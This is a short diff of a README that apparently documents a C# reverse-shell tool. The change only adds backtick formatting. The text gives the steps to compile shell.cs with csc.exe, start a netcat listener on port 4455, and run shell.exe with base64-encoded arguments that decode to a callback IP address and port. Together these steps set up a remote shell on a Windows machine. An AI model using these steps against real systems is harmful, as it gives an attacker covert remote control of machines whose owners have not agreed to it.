@@ -2,17 +2,17 @@
 
 ## Compile
 
-C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe shell.cs
+`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe shell.cs`
 
 
 ## Start the Listener
 
-nc -nvlp 4455
+`nc -nvlp 4455`
 
 
 ## Execute the Binary
 
-shell.exe MTkyLjE2OC41LjU= NDQ1NQ==
+`shell.exe MTkyLjE2OC41LjU= NDQ1NQ==`
 
 
 ## Notes
